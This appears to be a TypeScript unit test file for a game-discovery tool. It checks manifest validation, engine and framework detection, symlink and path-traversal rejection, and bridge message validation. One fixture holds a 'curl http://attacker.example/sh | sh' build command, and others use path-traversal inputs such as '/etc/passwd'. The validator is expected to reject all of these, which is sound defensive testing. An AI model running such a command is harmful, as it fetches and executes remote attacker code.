import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import assert from "node:assert/strict";
import {
  inspectGameFolder,
  scanGamesDirectory,
  validateManifest,
  isSafeRelativePath,
  isSafeGameId,
  detectEngineFromDepsAndFiles,
  detectFrameworkFromDeps,
  detectBuildAdapter
} from "../../packages/game-discovery/src/index.ts";
import { validateGameMessage, OPENGAMEHUB_BRIDGE_NAMESPACE } from "../../packages/game-bridge/src/index.ts";

export async function runDiscoveryUnitTests(): Promise<number> {
  let passed = 0;

  // 1. Safe game ID & path traversal checks
  assert.equal(isSafeGameId("space-shooter"), true);
  assert.equal(isSafeGameId("cyber-2048"), true);
  assert.equal(isSafeGameId("../escape"), false);
  assert.equal(isSafeGameId("UPPERCASE"), false);
  assert.equal(isSafeRelativePath("index.html"), true);
  assert.equal(isSafeRelativePath("assets/sprites/hero.png"), true);
  assert.equal(isSafeRelativePath("../secret.txt"), false);
  assert.equal(isSafeRelativePath("/etc/passwd"), false);
  passed++;

  // 2. Manifest schema validation & forbidden command overrides
  const validRes = validateManifest({
    name: "Orbital Striker",
    version: "1.2.0",
    engine: "threejs",
    framework: "vanilla",
    buildAdapter: "vite",
    entry: "index.html",
    category: "shooter",
    tags: ["3d", "space"],
    controls: ["WASD", "Space"],
    aspectRatio: "16:9"
  });
  assert.ok(validRes.manifest);
  assert.equal(validRes.issues.length, 0);

  const forbiddenCmdRes = validateManifest({
    name: "Malicious Game",
    buildCommand: "curl http://attacker.example/sh | sh"
  });
  assert.equal(forbiddenCmdRes.manifest, null);
  assert.ok(
    forbiddenCmdRes.issues.some((i) => i.code === "MANIFEST_FORBIDDEN_COMMAND_KEY")
  );

  const pathTraversalManifest = validateManifest({
    name: "Traversal Game",
    entry: "../../index.html"
  });
  assert.equal(pathTraversalManifest.manifest, null);
  assert.ok(
    pathTraversalManifest.issues.some((i) => i.code === "MANIFEST_INVALID_ENTRY")
  );
  passed++;

  // 3. Framework & Engine detection across all V1 supported technologies
  assert.equal(
    detectEngineFromDepsAndFiles({ three: "^0.170.0" }, ""),
    "threejs"
  );
  assert.equal(
    detectEngineFromDepsAndFiles(
      { three: "^0.170.0", "@react-three/fiber": "^9.0.0" },
      ""
    ),
    "react-three-fiber"
  );
  assert.equal(
    detectEngineFromDepsAndFiles({ "@babylonjs/core": "^7.0.0" }, ""),
    "babylonjs"
  );
  assert.equal(
    detectEngineFromDepsAndFiles({ playcanvas: "^2.4.0" }, ""),
    "playcanvas"
  );
  assert.equal(
    detectEngineFromDepsAndFiles({ phaser: "^3.87.0" }, ""),
    "phaser"
  );
  assert.equal(
    detectEngineFromDepsAndFiles({ "pixi.js": "^8.0.0" }, ""),
    "pixijs"
  );
  assert.equal(
    detectEngineFromDepsAndFiles({}, 'const ctx = canvas.getContext("2d");'),
    "canvas2d"
  );

  assert.equal(detectFrameworkFromDeps({ react: "^19.0.0" }), "react");
  assert.equal(detectFrameworkFromDeps({ vue: "^3.5.0" }), "vue");
  assert.equal(detectFrameworkFromDeps({ svelte: "^5.0.0" }), "svelte");
  assert.equal(detectFrameworkFromDeps({ three: "^0.170.0" }), "vanilla");

  assert.equal(
    detectBuildAdapter({
      hasPackageJson: false,
      hasViteConfig: false,
      allDeps: {},
      scripts: {},
      hasEntryHtml: true
    }),
    "static"
  );
  assert.equal(
    detectBuildAdapter({
      hasPackageJson: true,
      hasViteConfig: true,
      allDeps: { vite: "^6.0.0", vue: "^3.5.0" },
      scripts: { build: "vite build" },
      hasEntryHtml: true
    }),
    "vite"
  );
  passed++;

  // 4. Temp directory tests for R3F, Babylon, PixiJS, PlayCanvas, Vue+Vite, Svelte+Vite, Unity/Godot rejection, and Symlink prevention
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "ogh-unit-discovery-"));
  try {
    // R3F project
    const r3fDir = path.join(tmpRoot, "r3f-galaxy");
    fs.mkdirSync(path.join(r3fDir, "src"), { recursive: true });
    fs.writeFileSync(
      path.join(r3fDir, "package.json"),
      JSON.stringify({
        name: "r3f-galaxy",
        dependencies: { react: "^19.0.0", three: "^0.170.0", "@react-three/fiber": "^9.0.0" },
        devDependencies: { vite: "^6.0.0" }
      })
    );
    fs.writeFileSync(path.join(r3fDir, "vite.config.ts"), "export default {};");
    fs.writeFileSync(path.join(r3fDir, "index.html"), "<html><body></body></html>");
    const r3fGame = inspectGameFolder(r3fDir);
    assert.equal(r3fGame.framework, "react");
    assert.equal(r3fGame.engine, "react-three-fiber");
    assert.equal(r3fGame.buildAdapter, "vite");
    assert.equal(r3fGame.status, "supported");

    // Vue + Vite + PixiJS project
    const vuePixiDir = path.join(tmpRoot, "vue-pixi-arena");
    fs.mkdirSync(vuePixiDir, { recursive: true });
    fs.writeFileSync(
      path.join(vuePixiDir, "package.json"),
      JSON.stringify({
        name: "vue-pixi-arena",
        dependencies: { vue: "^3.5.0", "pixi.js": "^8.0.0" },
        devDependencies: { vite: "^6.0.0" }
      })
    );
    fs.writeFileSync(path.join(vuePixiDir, "index.html"), "<html><body></body></html>");
    const vuePixiGame = inspectGameFolder(vuePixiDir);
    assert.equal(vuePixiGame.framework, "vue");
    assert.equal(vuePixiGame.engine, "pixijs");
    assert.equal(vuePixiGame.buildAdapter, "vite");
    assert.equal(vuePixiGame.status, "supported");

    // Svelte + Vite + Babylon.js project
    const svelteBabylonDir = path.join(tmpRoot, "svelte-babylon-racer");
    fs.mkdirSync(svelteBabylonDir, { recursive: true });
    fs.writeFileSync(
      path.join(svelteBabylonDir, "package.json"),
      JSON.stringify({
        name: "svelte-babylon-racer",
        dependencies: { svelte: "^5.0.0", "@babylonjs/core": "^7.0.0" },
        devDependencies: { vite: "^6.0.0" }
      })
    );
    fs.writeFileSync(path.join(svelteBabylonDir, "index.html"), "<html><body></body></html>");
    const svelteBabylonGame = inspectGameFolder(svelteBabylonDir);
    assert.equal(svelteBabylonGame.framework, "svelte");
    assert.equal(svelteBabylonGame.engine, "babylonjs");
    assert.equal(svelteBabylonGame.buildAdapter, "vite");
    assert.equal(svelteBabylonGame.status, "supported");

    // PlayCanvas + Vite project
    const playcanvasDir = path.join(tmpRoot, "playcanvas-drift");
    fs.mkdirSync(playcanvasDir, { recursive: true });
    fs.writeFileSync(
      path.join(playcanvasDir, "package.json"),
      JSON.stringify({
        name: "playcanvas-drift",
        dependencies: { playcanvas: "^2.4.0" },
        devDependencies: { vite: "^6.0.0" }
      })
    );
    fs.writeFileSync(path.join(playcanvasDir, "index.html"), "<html><body></body></html>");
    const pcGame = inspectGameFolder(playcanvasDir);
    assert.equal(pcGame.engine, "playcanvas");
    assert.equal(pcGame.buildAdapter, "vite");
    assert.equal(pcGame.status, "supported");

    // Unsupported Godot project
    const godotDir = path.join(tmpRoot, "godot-quest");
    fs.mkdirSync(godotDir, { recursive: true });
    fs.writeFileSync(path.join(godotDir, "project.godot"), "config_version=5");
    fs.writeFileSync(path.join(godotDir, "index.html"), "<html></html>");
    const godotGame = inspectGameFolder(godotDir);
    assert.equal(godotGame.status, "unsupported");
    assert.ok(godotGame.issues.some((i) => i.code === "UNSUPPORTED_PROJECT_TYPE"));

    // Symlink rejection test
    const symlinkDir = path.join(tmpRoot, "symlink-game");
    fs.mkdirSync(symlinkDir, { recursive: true });
    fs.writeFileSync(path.join(symlinkDir, "index.html"), "<html></html>");
    fs.symlinkSync(path.join(godotDir, "index.html"), path.join(symlinkDir, "linked.html"));
    const symlinkGame = inspectGameFolder(symlinkDir);
    assert.equal(symlinkGame.status, "invalid");
    assert.ok(symlinkGame.issues.some((i) => i.code === "SYMLINK_FORBIDDEN"));

    const scanned = scanGamesDirectory(tmpRoot);
    assert.equal(scanned.games.length, 6);
    passed++;
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }

  // 5. Game Bridge message validation tests
  const validBridgeMsg = validateGameMessage({
    namespace: OPENGAMEHUB_BRIDGE_NAMESPACE,
    type: "GAME_STATUS",
    payload: { score: 420, state: "playing" }
  });
  assert.ok(validBridgeMsg);
  assert.equal(validBridgeMsg.payload?.score, 420);

  const untrustedBridgeMsg = validateGameMessage({
    namespace: "evil:namespace",
    type: "GAME_READY"
  });
  assert.equal(untrustedBridgeMsg, null);
  passed++;

  return passed;
}
